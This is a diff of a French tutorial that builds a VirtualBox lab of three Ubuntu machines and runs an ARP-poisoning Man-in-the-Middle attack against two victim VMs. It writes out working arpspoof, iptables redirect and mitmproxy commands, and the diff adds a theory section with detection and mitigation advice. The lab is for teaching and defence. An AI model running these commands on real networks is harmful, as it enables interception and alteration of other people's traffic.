@@ -1,6 +1,6 @@
-### Tutoriel Complet pour une Attaque Man-in-the-Middle avec Ubuntu 22.04
+### Tutoriel Complet pour une Attaque Man-in-the-Middle avec Ubuntu 22.04 et VirtualBox
 
-Voici un tutoriel détaillé pour configurer et exécuter une attaque Man-in-the-Middle (MITM) avec Ubuntu 22.04 sur VirtualBox, incluant toutes les étapes nécessaires, les configurations réseau, et les commandes.
+Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque Man-in-the-Middle (MITM) avec Ubuntu 22.04 sur VirtualBox, incluant toutes les étapes nécessaires, les configurations réseau, et les commandes.
 
 ### Pré-requis
 
@@ -31,18 +31,19 @@ Voici un tutoriel détaillé pour configurer et exécuter une attaque Man-in-the
 
 ### Configuration du Réseau
 
-#### Configuration du Réseau Interne
+#### Configuration du Réseau avec Double Adaptateur
 
 1. **Configurer les adaptateurs réseau** pour chaque machine dans VirtualBox :
    - **Machine Attaquant (Attacker)** :
-     - Adapter 1 : NAT
+     - Adapter 1 : Bridge Adapter (pour la connexion à Internet via DHCP)
      - Adapter 2 : Internal Network (nommé `intnet`)
    - **Machine Victime 1 (Victim 1)** et **Machine Victime 2 (Victim 2)** :
-     - Adapter 1 : Internal Network (nommé `intnet`)
+     - Adapter 1 : Bridge Adapter (pour la connexion à Internet via DHCP)
+     - Adapter 2 : Internal Network (nommé `intnet`)
 
-#### Configuration des Adresses IP Statiques
+#### Configuration des Adresses IP Statiques pour le Réseau Interne
 
-1. **Attribuer des adresses IP statiques** :
+1. **Attribuer des adresses IP statiques** sur l'interface interne (enp0s8) :
 
    - Pour la machine `Attacker` :
      - Ouvrez un terminal et éditez le fichier `/etc/netplan/00-installer-config.yaml` :
@@ -72,6 +73,8 @@ Voici un tutoriel détaillé pour configurer et exécuter une attaque Man-in-the
          version: 2
          ethernets:
            enp0s3:
+             dhcp4: true
+           enp0s8:
              dhcp4: no
              addresses:
                - 192.168.1.20/24
@@ -94,6 +97,8 @@ Voici un tutoriel détaillé pour configurer et exécuter une attaque Man-in-the
          version: 2
          ethernets:
            enp0s3:
+             dhcp4: true
+           enp0s8:
              dhcp4: no
              addresses:
                - 192.168.1.30/24
@@ -154,34 +159,32 @@ Voici un tutoriel détaillé pour configurer et exécuter une attaque Man-in-the
 
 ### Étape 1 : Empoisonner les Tables ARP
 
-#### 1. Empoisonner la Table ARP de Victim1
+1. **Empoisonner la Table ARP de Victim1**
 
-1. Exécutez la commande suivante sur la machine attaquant (`attacker`) :
-   ```sh
-   sudo arpspoof -i enp0s8 -t 192.168.1.20 192.168.1.30
-   ```
+   - Exécutez la commande suivante sur la machine attaquant (`attacker`) :
+     ```sh
+     sudo arpspoof -i enp0s8 -t 192.168.1.20 192.168.1.30
+     ```
 
-#### 2. Empoisonner la Table ARP de Victim2
+2. **Empoisonner la Table ARP de Victim2**
 
-1. Ouvrez un nouveau terminal sur `attacker`.
-
-2. Exécutez la commande suivante :
-   ```sh
-   sudo arpspoof -i enp0s8 -t 192.168.1.30 192.168.1.20
-   ```
+   - Ouvrez un nouveau terminal sur `attacker`.
+   - Exécutez la commande suivante :
+     ```sh
+     sudo arpspoof -i enp0s8 -t 192.168.1.30 192.168.1.20
+     ```
 
 ### Étape 2 : Configurer `iptables` pour Rediriger le Trafic HTTP
 
-1. Ouvrez un nouveau terminal sur `attacker`.
-
-2. Exécutez la commande suivante pour rediriger le trafic HTTP vers `mitmproxy` :
+1. **Ouvrez un nouveau terminal sur `attacker`**.
+2. **Exécutez la commande suivante pour rediriger le trafic HTTP vers `mitmproxy`** :
    ```sh
    sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8080
    ```
 
 ### Étape 3 : Lancer un Proxy MITM
 
-1. Sur la machine attaquant, lancez `mitmproxy` :
+1. **Sur la machine attaquant, lancez `mitmproxy`** :
    ```sh
    sudo mitmproxy -p 8080
    ```
@@ -221,5 +224,31 @@ sudo mitmproxy -p 8080
 sudo iptables -t nat -F
 ```
 
-En suivant ce tutoriel, vos machines virtuelles pourront communiquer entre elles via le réseau interne et accéder à Internet, tout en permettant de configurer et d'observer une attaque Man-in-the-Middle de manière sécurisée et contrôlée.
+### Théorie et Explications Vulgarisées
 
+#### Qu'est-ce qu'une Attaque Man-in-the-Middle (MITM) ?
+
+Imaginez deux amis, Alice (Victim1) et Bob (Victim2), qui échangent des lettres. Mallory (Attacker) est un individu malveillant qui intercepte et lit toutes les lettres échangées entre Alice et Bob, et parfois il modifie le contenu des lettres avant de
+
+ les envoyer à la destination prévue. Une attaque Man-in-the-Middle fonctionne de manière similaire en interceptant les communications entre deux parties.
+
+#### Comment l'Attaque Fonctionne-t-elle ?
+
+1. **Empoisonnement ARP** :
+   - Mallory trompe Alice et Bob en leur faisant croire que son adresse (adresse MAC de Mallory) est celle de l'autre.
+   - Résultat : Tout le trafic entre Alice et Bob passe par Mallory.
+
+2. **Redirection du Trafic** :
+   - Mallory redirige tout le trafic HTTP vers un proxy (mitmproxy) pour inspecter et éventuellement modifier les communications.
+
+#### Détection et Mitigation
+
+1. **Utiliser Wireshark pour Détecter** :
+   - Wireshark est comme une caméra de sécurité qui enregistre tout ce qui se passe sur le réseau.
+   - Vous pouvez capturer et analyser les paquets ARP pour détecter des anomalies.
+
+2. **Configurer des Entrées ARP Statiques** :
+   - Ajouter des entrées ARP statiques est comme fixer des étiquettes sur les boîtes aux lettres pour que les lettres (paquets) aillent toujours au bon endroit.
+   - Utilisez les commandes `arp` pour ajouter des entrées ARP statiques sur les machines victimes.
+
+En suivant ces étapes, vous pouvez configurer, exécuter et comprendre une attaque Man-in-the-Middle, tout en apprenant comment détecter et mitiger de telles attaques pour assurer la sécurité de votre réseau.
